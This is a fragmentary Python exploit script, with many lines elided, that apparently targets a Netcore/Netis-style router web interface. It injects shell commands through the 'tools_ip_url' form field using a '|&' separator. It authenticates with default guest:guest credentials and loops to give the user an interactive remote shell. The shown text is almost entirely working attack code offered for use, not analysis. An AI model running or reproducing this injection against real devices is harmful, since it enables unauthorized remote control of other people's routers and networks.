...
def exploit(host):
    ...
    try :
        ...
        cmd_data = "mode_name=netcore_set&tools_type=2&tools_ip_url=|& "+cmd+"&tools_cmd=1&net_tools_set=1&wlan_idx_num=0"
...
#           print(data)
            ...
            while True:
                ...
                cmd_data = "mode_name=netcore_set&tools_type=2&tools_ip_url=|& "+cmd+"&tools_cmd=1&net_tools_set=1&wlan_idx_num=0"
                req_payload = requests.post(vulnerable_page, data=cmd_data, headers=headers_value, auth = HTTPBasicAuth("guest", "guest"))
...
if __name__ == "__main__":
    ...
    ap.add_argument("host", help="URL (Example: http://192.168.1.1:8080).")
    args = ap.parse_args()
    main()
